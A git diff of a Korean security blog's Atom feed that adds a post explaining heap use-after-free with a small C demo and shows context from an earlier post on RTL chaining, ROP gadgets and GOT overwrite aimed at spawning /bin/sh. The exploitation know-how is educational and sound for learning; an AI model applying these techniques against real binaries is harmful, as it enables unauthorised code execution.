@@ -2,17 +2,10 @@
 
 <feed xmlns="http://www.w3.org/2005/Atom" >
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
-<<<<<<< HEAD
-  <link href="http://localhost:4000/tag/posts/feed.xml" rel="self" type="application/atom+xml" />
-  <link href="http://localhost:4000/" rel="alternate" type="text/html" />
-  <updated>2019-06-30T20:31:04+09:00</updated>
-  <id>http://localhost:4000/tag/posts/feed.xml</id>
-=======
   <link href="/tag/posts/feed.xml" rel="self" type="application/atom+xml" />
   <link href="/" rel="alternate" type="text/html" />
-  <updated>2019-07-22T01:18:05+09:00</updated>
+  <updated>2019-07-26T22:15:25+09:00</updated>
   <id>/tag/posts/feed.xml</id>
->>>>>>> 3821445ebc891b7f6f8c4650c227f2acea9b8228
 
   
   
@@ -45,6 +38,154 @@
   
   
 
+  
+    <entry>
+      <title type="html">linux_0x07 UAF(Use After Free) - 1부</title>
+      <link href="/linux_0x07" rel="alternate" type="text/html" title="linux_0x07 UAF(Use After Free) - 1부" />
+      <published>2019-07-27T06:10:00+09:00</published>
+      <updated>2019-07-27T06:10:00+09:00</updated>
+      <id>/linux_0x07</id>
+      <content type="html" xml:base="/linux_0x07">&lt;h1 id=&quot;uafuse-after-free---1부&quot;&gt;UAF(Use After Free) - 1부&lt;/h1&gt;
+
+&lt;p&gt;안녕하심꽈 Sulla임돠.&lt;/p&gt;
+
+&lt;p&gt;오늘은 &lt;strong&gt;UAF(Use After Free)&lt;/strong&gt;라는 &lt;strong&gt;Heap&lt;/strong&gt;영역에서 발생하는 버그를 이용한 공격 기법을 알아 보겠습니다.&lt;/p&gt;
+
+&lt;p&gt;앞 선 포스트에서 &lt;strong&gt;Heap&lt;/strong&gt; 구조를 설명 드릴 때 &lt;strong&gt;malloc()&lt;/strong&gt; 함수 등으로 Heap 영역을 &lt;strong&gt;할당&lt;/strong&gt; 받은 후에 반드시 해야하는 행위가 있다 했습니다. 
+바로 &lt;strong&gt;Free()&lt;/strong&gt;라고 하는 함수를 사용해서 할당 받은 Heap영역을 &lt;strong&gt;해제&lt;/strong&gt; 해야 한다고 알려 드렸습니다.
+할당 받고 다 쓴 영역을 다시 반납하는 과정이지요.
+(도서관에서 책을 빌려보고 다 봤으니 반납하는 책 대여 시스템을 생각하시면 됩니다.)
+그런데 왜 이 짓거리에서 버그가 발생하고 이를 이용해 취약점으로 사용할까요?&lt;/p&gt;
+
+&lt;p&gt;언제나 그랬듯 이해를 위한 간단한 그림으로 알아보도록 하겠습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x07/0x07-1.png&quot; alt=&quot;[그림 7-1]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;위 그림에서 보이듯 A 이름으로 malloc()으로 8byte 할당 받고 “AAAA”를 저장해 두고 A를 출력 하면 A에 저장해 두었던 “AAAA” 가 출력 될것입니다.&lt;/p&gt;
+
+&lt;p&gt;그 다음 할당 받은 A를 free()로 해제 시켜준 후 같은 8byte로 B이름으로 할당 받았습니다. 이 때 A에서와는 다르게 문자를 저장 하지 않았습니다.&lt;/p&gt;
+
+&lt;p&gt;이 상태에서 B를 출력 하면 어떤 값이 나올까요????&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x07/0x07-2.png&quot; alt=&quot;[그림 7-2]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;AAAA&lt;/strong&gt;가 됩니다. 앞에서 저장 했던 chunk A에 저장 되있던 AAAA가 free를 한 후에도 사라지지 않고 그대로 남아있다가 같은 크기로 새롭게 할당받은 영역 B에서까지 그대로 남아있는 상태며 출력까지도 되는 모습입니다.&lt;/p&gt;
+
+&lt;p&gt;정리하자면, A를 malloc()으로 할당 하여 chunk를 생성하고 A에 12345를 저장 후 free()로 A를 해제하고 B를 A와 같은 크기로 malloc()을 이용해 chunk를 생성한다. 이 때 12345는 저장 하지 않은 상태로 B에 저장된 값을 호출하면 A에 저장되어있던 12345가 출력됩니다. 
+free()로 해제한 상태인데도 기존에 저장되어있던 값이 그대로 호출 됩니다. 주소값 또한 B의 chunk 주소는 이미 free()로 해제한 A의 chunk주소와 동일한 상태입죠.&lt;/p&gt;
+
+&lt;p&gt;두 가지의 이유로 저렇게 같은 공간으로 재할당 받게 됩니다.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;효율 적인 공간 관리를 위하여&lt;/strong&gt;
+&lt;strong&gt;병합 지연&lt;/strong&gt;(&lt;strong&gt;Deferred Coalescing&lt;/strong&gt;)이라고 하며 해제된후 다시 할당 받을 때 Heap 영역을 병합, 분할하는 시간을 줄이기 위해서 해제된 영역을 그대로 보관 합니다.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;메모리 할당 알고리즘&lt;/strong&gt;
+&lt;strong&gt;최소 적합&lt;/strong&gt;(&lt;strong&gt;first fit&lt;/strong&gt;)이라고 하며 Heap은 해제를 효율적으로 운영하기 위해 &lt;strong&gt;Bin&lt;/strong&gt;이라는 구조를 사용 합니다. 즉 할당 받은 영역을 free하게 되면 &lt;strong&gt;Bin&lt;/strong&gt;에 저장된다 생각하시면 됩니다. 이 &lt;strong&gt;Bin&lt;/strong&gt;에서 사용되는 알고리즘 중 하나가 &lt;strong&gt;최소 적합 알고리즘&lt;/strong&gt;이며(first fit 외에 다른 알고리즘도 존재 합니다.) 해당 알고리즘의 특징은 여러가지가 있지만 가장 큰 특징은 대부분의 상황에 적합/최적 알고리즘이란 것이죠. 아래는 몇 가지 특징입니다만
+    &lt;ul&gt;
+      &lt;li&gt;&lt;strong&gt;사용 가능한 공간중 첫 번째 공간을 사용&lt;/strong&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;strong&gt;가장 최근 검색이 끝난 위치에서 시작&lt;/strong&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;strong&gt;Unsorted Chunk List&lt;/strong&gt; 형태로 &lt;strong&gt;cache 처럼 동작&lt;/strong&gt;&lt;/li&gt;
+      &lt;li&gt;……&lt;/li&gt;
+      &lt;li&gt;&lt;strong&gt;Anytime, Anywhere, Not Bad, So Good&lt;/strong&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+
+    &lt;p&gt;&lt;strong&gt;최소 적합 알고리즘&lt;/strong&gt;은 해제된 Chunk list를 Cache형태로 관리 하며 동일 크기 또는 비슷한 크기의 할당 요청(&lt;strong&gt;malloc()&lt;/strong&gt;)하면 bin에 저장된 해제된 Chunk list를 검색하여 사용 가능한 첫 번째 공간을 바로 할당 합니다.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;아래 예제 코드로 테스트 해보겠슴돠!!&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+
+int main(void)
+{
+    int* A;
+    int* B;
+    int* C;
+    int* D;
+
+    A = (int*)malloc(256);
+    B = (int*)malloc(256);
+
+    printf(&quot;1. malloc A addr &amp;amp; data : %p, %#x\n&quot;, A, *A);
+
+    *B = 0x1234abcd;
+    printf(&quot;2. malloc B addr &amp;amp; data : %p, %#x\n&quot;, B, *B);
+
+    free(B);
+    printf(&quot;[free malloc B]\n&quot;);
+
+    C = (int*)malloc(256);
+    printf(&quot;3. malloc C addr &amp;amp; data : %p, %#x\n&quot;, C, *C);
+
+    D = (int*)malloc(1024);
+    printf(&quot;4. malloc D addr &amp;amp; data : %p, %#x\n&quot;, D, *D);
+
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A, B, C, D 포인터 생성하고 A와 B에 malloc(256)을 할당해주고 A의 주소와 데이터를 출력 합니다. 다음으로 B에 값을 입력해주고 마찬가지로 주소와 데이터를 출력해줍니다. 이번에는 B를 해제해주고 C를malloc(256) 항당하고 주소와 데이터를 출력합니다. 다음은 D의 malloc 을 할당 해주지만 용량을 1024로 증가시켜주고 주소와 데이터를 출력해주는 코드입니다.&lt;/p&gt;
+
+&lt;p&gt;위 코드를 실행할 경우 어떤 결과가 나올지 상상해보며 낭낭하게 직접 실행해 보겠습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x07/0x07-3.png&quot; alt=&quot;[그림 7-3]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;1번의 malloc  A의 주소와 데이터와 2번의 malloc B의 주소와 데이터를 보시면 다르다는걸 확인할 수 있습니다. 그다음 B를 해제해주고 같은 용량의 malloc C를 할당했을 때의 주소와 데이터를 확인하시면 B와 같음을 확인할 수 있으며 malloc D의 경우 용량이 달라지니깐 주소값도 데이터도 달라짐을 확인 가능합니다.&lt;/p&gt;
+
+&lt;p&gt;중요한건 B의 free 후에 생성된 동일 용량의 C를 확인 했을때 입니다. C를 같은 용량으로 할당만 했을뿐 데이터의 입력은 없었는데 이미 해제한 B의 데이터가 여전히 출력 됩니다.&lt;/p&gt;
+
+&lt;p&gt;위 예제로 &lt;strong&gt;포인터가 이미 해제된 영역을 여전히 가리키는 현상&lt;/strong&gt;을 확인할 수 있습니다.
+이러한 현상을 &lt;strong&gt;Dangling Pointer&lt;/strong&gt;라고 부릅니다. (현실에는 없는 마음속의 공간이나 존재 하지 않는 상상속의 여친을 생각하세요……뭐요!?)
+지금 알아보고 있는 &lt;strong&gt;UAF(Use After Free)&lt;/strong&gt;는 &lt;strong&gt;Dangling Pointer&lt;/strong&gt;를 재사용 함으로서 생기는 것이죠.&lt;/p&gt;
+
+&lt;p&gt;간단하게, 결국 &lt;strong&gt;UAF&lt;/strong&gt;는 &lt;strong&gt;잘못된 포인터 관리로 생기는 취약점&lt;/strong&gt;입니다.&lt;/p&gt;
+
+&lt;p&gt;말이 길어졌습니다만 어쨌든 Heap 영역에서 할당 받은 후 해제 시 해당 영역을 &lt;strong&gt;초기화&lt;/strong&gt; 하지 않을 경우  데이터가 의도치 않게 계속 남아 있는 상태가 됩니다. 이 점과 지금껏 해왔던 것을 잘 짜집기 하면 원하는 방향으로 공격이 가능하지 않을까 싶습니다.&lt;/p&gt;
+
+&lt;p&gt;지금까지 장황하게 UAF에 대한 내용을 다뤄봤습니다.
+다음 포스팅에서 이어서 실제 shell을 따도록 하겠습니다.
+사실 이번 포스팅 작성 하다가 한 번 날려 먹어서 멘탈도 같이 날려 먹었습니다…..
+그래서 두 편을 나누는건 아닙니다….급하게 마무리 하는듯 하지만 아닙니다…….뭐요?&lt;/p&gt;
+
+&lt;p&gt;빠른 시일내에 다음 포스팅 들고 뵙겠습니다.&lt;/p&gt;
+
+&lt;p&gt;수고하셨습니다.&lt;/p&gt;
+
+&lt;p&gt;뿅&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Sulla</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="Posts" />
+      
+
+      
+        <summary type="html">UAF(Use After Free) - 1부</summary>
+      
+
+      
+      
+    </entry>
   
     <entry>
       <title type="html">CVE-2012-4782</title>
@@ -804,11 +945,13 @@ chunk 자체가 단일 mmap() 시스템 콜을 통해 할당되었을 때 셋팅
 
 &lt;p&gt;지금까지 알아본 Stack관련 내용은 모두 오늘 포스팅을 위해 알아본것입니다. 그럼 먼저 이번에는 &lt;strong&gt;RTL Chaining&lt;/strong&gt;에 대해 알아 보겠습니다. &lt;strong&gt;RTL Chaining&lt;/strong&gt;은 원하는 라이브러리 함수를 여러번 호출하는 기법입니다. 어떻게 여러번 호출 하느냐 전에 &lt;strong&gt;Gadget&lt;/strong&gt; 이라는 개념을 알아야 합니다.&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Gadget&lt;/strong&gt; 의 사전 의미는 “(작고 유용한) 도구” 의미입니다만, 우리가 다루는 &lt;strong&gt;bof&lt;/strong&gt;에서의 &lt;strong&gt;Gadget&lt;/strong&gt;은 &lt;strong&gt;RET로 끝나는 연속된 함수&lt;/strong&gt;를 지칭 합니다. 대표적으로 &lt;strong&gt;P&lt;/strong&gt;OP &lt;strong&gt;P&lt;/strong&gt;OP &lt;strong&gt;R&lt;/strong&gt;ET&lt;strong&gt;(PPR)&lt;/strong&gt;를 사용합니다. 
-&lt;strong&gt;PPR&lt;/strong&gt;의 용도는 “&lt;strong&gt;함수에 사용된 인자들을 정리하기 위해 사용되는 것&lt;/strong&gt;” 으로 알아두시면 됩니다.(POP의 역할을 생각해보시면 쉽습니다!)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Gadget&lt;/strong&gt; 의 사전 의미는 “(작고 유용한) 도구” 의미입니다만, 우리가 다루는 &lt;strong&gt;bof&lt;/strong&gt;에서의 &lt;strong&gt;Gadget&lt;/strong&gt;은 &lt;strong&gt;RET로 끝나는 연속된 함수&lt;/strong&gt;를 지칭 합니다. 대표적으로 &lt;strong&gt;P&lt;/strong&gt;OP &lt;strong&gt;P&lt;/strong&gt;OP &lt;strong&gt;R&lt;/strong&gt;ET&lt;strong&gt;(PPR)&lt;/strong&gt;를 사용합니다.&lt;/p&gt;
 
-&lt;p&gt;그럼 어떻게 &lt;strong&gt;PPR&lt;/strong&gt;을 사용해서 원하는 행위를 유도하는지 알아 보도록 하죠.
-위에서 &lt;strong&gt;RTL&lt;/strong&gt;을 설명드릴 때 &lt;strong&gt;RET&lt;/strong&gt; 구역에 system()의 주소가 위치하고 바로 이어서 무의미한 값을 채웠습니다. 그 다음 /bin/sh 의 주소를 위치 시켰었죠. 지금은 RET구역 다음에 위치하던 무의미한 값을 채우는것이 아닌 Gadget을 위치시키도록 합니다. 이 때 RET에 위치하는 함수가 사용하는 인자의 갯수에 맞춰 PPR의 모양이 달라집니다.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;PPR&lt;/strong&gt;의 용도는 “&lt;strong&gt;함수에 사용된 인자들을 정리하기 위해 사용되는 것&lt;/strong&gt;” 으로 알아두시면 됩니다.(POP의 역할을 생각해보시면 쉽습니다!)&lt;/p&gt;
+
+&lt;p&gt;그럼 어떻게 &lt;strong&gt;PPR&lt;/strong&gt;을 사용해서 원하는 행위를 유도하는지 알아 보도록 하죠.&lt;/p&gt;
+
+&lt;p&gt;위에서 &lt;strong&gt;RTL&lt;/strong&gt;을 설명드릴 때 &lt;strong&gt;RET&lt;/strong&gt; 구역에 system()의 주소가 위치하고 바로 이어서 무의미한 값을 채웠습니다. 그 다음 /bin/sh 의 주소를 위치 시켰었죠. 지금은 RET구역 다음에 위치하던 무의미한 값을 채우는것이 아닌 Gadget을 위치시키도록 합니다. 이 때 RET에 위치하는 함수가 사용하는 인자의 갯수에 맞춰 PPR의 모양이 달라집니다.&lt;/p&gt;
 
 &lt;p&gt;함수가 사용하는 인자가 &lt;strong&gt;2&lt;/strong&gt;개라면 &lt;strong&gt;PPR&lt;/strong&gt;, &lt;strong&gt;1&lt;/strong&gt;개라면 &lt;strong&gt;PR&lt;/strong&gt;, &lt;strong&gt;5&lt;/strong&gt;개라면 &lt;strong&gt;PPPPPR&lt;/strong&gt;이 됩니다. 우리는 &lt;strong&gt;system()&lt;/strong&gt; 함수를 사용하며 이 친구는 &lt;strong&gt;1개의 인자를 사용&lt;/strong&gt;합니다. 따라서 &lt;strong&gt;PR&lt;/strong&gt;(POP RET)이 되겠습니다.&lt;/p&gt;
 
@@ -817,7 +960,9 @@ chunk 자체가 단일 mmap() 시스템 콜을 통해 할당되었을 때 셋팅
 &lt;p&gt;즉, 공격자의 입맛대로 공격 페이로드를 디잔인할 수 있는 것이죠. 그림으로 비교 해보겠습니다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-1.png&quot; alt=&quot;[그림 5-1]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;위의 그림이 앞 포스팅에서 함께 봤던 일반적인 RTL입니다. execl()을 실행 시켜서 4byte 뒤에 위치시켜둔 인자를 받아내고 RET 위치위 AAAA로 이동 후 error를 발생 시키고 종료 합니다.(error 발생이 싫으신 분들은 exit() 함수를 위치 시켜주시면 종료 됩니다.) 이 작업을 여러번 chain처럼 연결 시켜 연속적으로 RTL을 사용하는  &lt;strong&gt;RTL Chaining&lt;/strong&gt;이 완성 됩니다. 다음은 &lt;strong&gt;RTL Chaining&lt;/strong&gt;을 보도록 하겠습니다.&lt;/p&gt;
@@ -825,7 +970,9 @@ chunk 자체가 단일 mmap() 시스템 콜을 통해 할당되었을 때 셋팅
 &lt;h1 id=&quot;rtl-chaining&quot;&gt;RTL Chaining&lt;/h1&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-2.png&quot; alt=&quot;[그림 5-2]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;쉬운 이해를 위해서 함수를 단순화 했습니다. func1()함수는 두 개의 인자를, func2()는 한 개의 인자를 사용합니다. 따라서 func1()이 끝나고 func2()로 이어기 위해선 PPR이 필요합니다.&lt;/p&gt;
@@ -845,14 +992,19 @@ chunk 자체가 단일 mmap() 시스템 콜을 통해 할당되었을 때 셋팅
 &lt;p&gt;&lt;strong&gt;GOT&lt;/strong&gt;는 &lt;strong&gt;Global Offset Table&lt;/strong&gt;의 약자로 &lt;strong&gt;PLT&lt;/strong&gt;가 참조하는 테이블입니다. 프로시저들의 실제 주소가 있습니다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-3.png&quot; alt=&quot;[그림 5-3]&quot; /&gt;
+
 &lt;/figure&gt;
 
-&lt;p&gt;그림에서 보는 과정처럼 &lt;strong&gt;함수를 처음 호출 할 경우&lt;/strong&gt; &lt;strong&gt;PLT&lt;/strong&gt;에서 &lt;strong&gt;GOT&lt;/strong&gt;를 참조하며 &lt;strong&gt;GOT&lt;/strong&gt;는 호출된 함수의 실제 주소를 찾기위해 여러 과정을 거칩니다.(&lt;strong&gt;PLT&lt;/strong&gt; &amp;gt; &lt;strong&gt;GOT&lt;/strong&gt; &amp;gt; &lt;strong&gt;resolve&lt;/strong&gt; &amp;gt; &lt;strong&gt;fixup&lt;/strong&gt; &amp;gt; &lt;strong&gt;symbol&lt;/strong&gt; &amp;gt; &lt;strong&gt;fixup&lt;/strong&gt; &amp;gt; &lt;strong&gt;resolve&lt;/strong&gt; &amp;gt; &lt;strong&gt;return&lt;/strong&gt;)
-최종적으로 &lt;strong&gt;resolve&lt;/strong&gt;에서 호출 함수의 주소 리턴하며 실행 됩니다.&lt;/p&gt;
+&lt;p&gt;그림에서 보는 과정처럼 &lt;strong&gt;함수를 처음 호출 할 경우&lt;/strong&gt; &lt;strong&gt;PLT&lt;/strong&gt;에서 &lt;strong&gt;GOT&lt;/strong&gt;를 참조하며 &lt;strong&gt;GOT&lt;/strong&gt;는 호출된 함수의 실제 주소를 찾기위해 여러 과정을 거칩니다.(&lt;strong&gt;PLT&lt;/strong&gt; &amp;gt; &lt;strong&gt;GOT&lt;/strong&gt; &amp;gt; &lt;strong&gt;resolve&lt;/strong&gt; &amp;gt; &lt;strong&gt;fixup&lt;/strong&gt; &amp;gt; &lt;strong&gt;symbol&lt;/strong&gt; &amp;gt; &lt;strong&gt;fixup&lt;/strong&gt; &amp;gt; &lt;strong&gt;resolve&lt;/strong&gt; &amp;gt; &lt;strong&gt;return&lt;/strong&gt;)&lt;/p&gt;
+
+&lt;p&gt;최종적으로 &lt;strong&gt;resolve&lt;/strong&gt;에서 호출 함수의 주소 리턴하며 실행 됩니다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-4.png&quot; alt=&quot;[그림 5-4]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;위 그림에서 처럼 &lt;strong&gt;함수가 한 번 호출 되고 나면 GOT에 해당 함수의 주소가 저장&lt;/strong&gt; 됩니다. 그 후에 다시 해당 함수를 호출할 경우 첫 함수 호출 때 처럼 복잡한 과정은 생략되고 &lt;strong&gt;바로 GOT에 저장된 주소를 참조하여 호출&lt;/strong&gt; 됩니다.&lt;/p&gt;
@@ -864,7 +1016,9 @@ chunk 자체가 단일 mmap() 시스템 콜을 통해 할당되었을 때 셋팅
 &lt;p&gt;공격자가 GOT에 저장된 주소를 특정 주소로 바꾼다면???GOT에서 호출되는 주소는 호출 함수의 주소가 아닌 지정된 임의의 주소로 호출이 가능하게 됩니다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-5.png&quot; alt=&quot;[그림 5-5]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;위 그림처럼 표현 해봤습니다. GOT Overwrite 라는 기법입니다. 그림에서 보이듯 GOT에 공격자가 원하는 함수의 주소를 저장 시켜놓고 해당 함수를 호출하여 동작하게 되는 시나리오가 그려집니다.&lt;/p&gt;
@@ -876,34 +1030,54 @@ chunk 자체가 단일 mmap() 시스템 콜을 통해 할당되었을 때 셋팅
 &lt;h1 id=&quot;ropreturn-oriented-programming&quot;&gt;ROP(Return Oriented Programming)&lt;/h1&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;buffer 크기 :&lt;/li&gt;
-  &lt;li&gt;strcpy() 주소 :&lt;/li&gt;
-  &lt;li&gt;execve() 주소 :&lt;/li&gt;
-  &lt;li&gt;PPR 주소 :&lt;/li&gt;
-  &lt;li&gt;.BSS 주소 :&lt;/li&gt;
-  &lt;li&gt;puts@plt 주소 :&lt;/li&gt;
-  &lt;li&gt;puts@got 주소 :&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;buffer 크기 :&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;strcpy() 주소 :&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;execve() 주소 :&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;PPR 주소 :&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;.BSS 주소 :&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;puts@plt 주소 :&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;puts@got 주소 :&lt;/p&gt;
+  &lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;먼저 &lt;strong&gt;ROP&lt;/strong&gt;진행을 위해 위 내용들이 필요 합니다. 그런데 &lt;strong&gt;puts()&lt;/strong&gt;라는 처음 보는 아이가 보이네요. 저 아이는 printf() 함수와 같은 문자열 출력 역할을 합니다. 약간의 차이는 있습니다만 쉽게 생각해 printf()보다 단순화(&lt;strong&gt;한 개의 인자만 처리&lt;/strong&gt;) 및 빠른 처리가 가능한 문자열 출력 함수라 생각하시면 됩니다. 
-그런데 왜 puts() 저놈이 보이느냐면 상위 버전의 linux 환경에서는 한 개의 인자만 사용해서 printf()를 사용할 경우 알아서 더 효율적인 puts()함수로 사용 하게 됩니다.&lt;/p&gt;
+&lt;p&gt;먼저 &lt;strong&gt;ROP&lt;/strong&gt;진행을 위해 위 내용들이 필요 합니다. 그런데 &lt;strong&gt;puts()&lt;/strong&gt;라는 처음 보는 아이가 보이네요. 저 아이는 printf() 함수와 같은 문자열 출력 역할을 합니다. 약간의 차이는 있습니다만 쉽게 생각해 printf()보다 단순화(&lt;strong&gt;한 개의 인자만 처리&lt;/strong&gt;) 및 빠른 처리가 가능한 문자열 출력 함수라 생각하시면 됩니다.&lt;/p&gt;
+
+&lt;p&gt;그런데 왜 puts() 저놈이 보이느냐면 상위 버전의 linux 환경에서는 한 개의 인자만 사용해서 printf()를 사용할 경우 알아서 더 효율적인 puts()함수로 사용 하게 됩니다.&lt;/p&gt;
 
 &lt;p&gt;어찌됫건 우리는 저 puts()의 got 주소를 원하는 함수로 바꿔야 합니다.(printf()이건 puts()건 결과는 같습니다.)&lt;/p&gt;
 
 &lt;p&gt;먼저 사용할 함수의 주소를 찾아보도록 하겠습니다. 전 포스트를 참고하셔서 &lt;strong&gt;execve()&lt;/strong&gt;주소를 아래처럼 찾아 주시면 됩니다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-6.png&quot; alt=&quot;[그림 5-6]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;그리고 &lt;strong&gt;strcpy()&lt;/strong&gt;와 &lt;strong&gt;puts@plt&lt;/strong&gt;와 &lt;strong&gt;puts@got&lt;/strong&gt;도 다음과 같이 뽑아줍시다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-7.png&quot; alt=&quot;[그림 5-7]&quot; /&gt;
+
 &lt;/figure&gt;
 
-&lt;p&gt;다음은 리눅스 기본 툴인 &lt;strong&gt;objdump&lt;/strong&gt;를 사용하여 &lt;strong&gt;PPR 의 주소&lt;/strong&gt;를 찾아보겠습니다.
-명령어는 다음중 아무거나 사용하셔도 상관 없습니다. 결과는 같습니다.&lt;/p&gt;
+&lt;p&gt;다음은 리눅스 기본 툴인 &lt;strong&gt;objdump&lt;/strong&gt;를 사용하여 &lt;strong&gt;PPR 의 주소&lt;/strong&gt;를 찾아보겠습니다.&lt;/p&gt;
+
+&lt;p&gt;명령어는 다음중 아무거나 사용하셔도 상관 없습니다. 결과는 같습니다.&lt;/p&gt;
 
 &lt;table&gt;
   &lt;tbody&gt;
@@ -924,18 +1098,25 @@ chunk 자체가 단일 mmap() 시스템 콜을 통해 할당되었을 때 셋팅
 &lt;/table&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-8.png&quot; alt=&quot;[그림 5-8]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;&lt;strong&gt;strcpy()&lt;/strong&gt;는 두 개의 인자를 사용하니 &lt;strong&gt;PPR&lt;/strong&gt;의 주소를 챙겨 둡니다.&lt;/p&gt;
 
-&lt;p&gt;다음은 .bss의 주소를 찾아 보겠습니다.
-.bss는 첫 포스팅에서 메모리 구조를 표현할때 나왔던 녀석입니다. 데이터 세그먼트의 한 부분이며 사용자에게 쓰기 권한이 있고 주소값이 변하지 않는 영역입니다.(&lt;strong&gt;초기화되지 않은 변수들이 저장되는 전역변수 영역&lt;/strong&gt;)
-쉽게 말해 공격자에게 사랑받는 영역입니다.(&lt;strong&gt;쓰기 가능&lt;/strong&gt;/&lt;strong&gt;고정 주소&lt;/strong&gt;)
-.bss는 gdb 내에서 info files 명령어를 사용하여 찾아줍니다.&lt;/p&gt;
+&lt;p&gt;다음은 .bss의 주소를 찾아 보겠습니다.&lt;/p&gt;
+
+&lt;p&gt;.bss는 첫 포스팅에서 메모리 구조를 표현할때 나왔던 녀석입니다. 데이터 세그먼트의 한 부분이며 사용자에게 쓰기 권한이 있고 주소값이 변하지 않는 영역입니다.(&lt;strong&gt;초기화되지 않은 변수들이 저장되는 전역변수 영역&lt;/strong&gt;)&lt;/p&gt;
+
+&lt;p&gt;쉽게 말해 공격자에게 사랑받는 영역입니다.(&lt;strong&gt;쓰기 가능&lt;/strong&gt;/&lt;strong&gt;고정 주소&lt;/strong&gt;)&lt;/p&gt;
+
+&lt;p&gt;.bss는 gdb 내에서 info files 명령어를 사용하여 찾아줍니다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-9.png&quot; alt=&quot;[그림 5-9]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;.bss의 시작 주소는 0x0804a020입니다만 겹침을 방지하기 위해 16byte 정도 뒤의 주소를 사용합니다. 따라서 16byte를 더한 주소값인 &lt;strong&gt;0x0804a030&lt;/strong&gt;이 되겠습니다.&lt;/p&gt;
@@ -943,19 +1124,25 @@ chunk 자체가 단일 mmap() 시스템 콜을 통해 할당되었을 때 셋팅
 &lt;p&gt;이제 마지막으로 Buffer의 사이즈를 확인 해보겠습니다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-10.png&quot; alt=&quot;[그림 5-10]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;이전 포스팅까지는 해당 위치의 EBP+ 값으로 버퍼의 크기를 확인 가능했지만 지금은 ESP가 자리 잡고 있으며 다른 방법으로 버퍼의 크기를 구해야 합니다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-11.png&quot; alt=&quot;[그림 5-11]&quot; /&gt;
+
 &lt;/figure&gt;
 
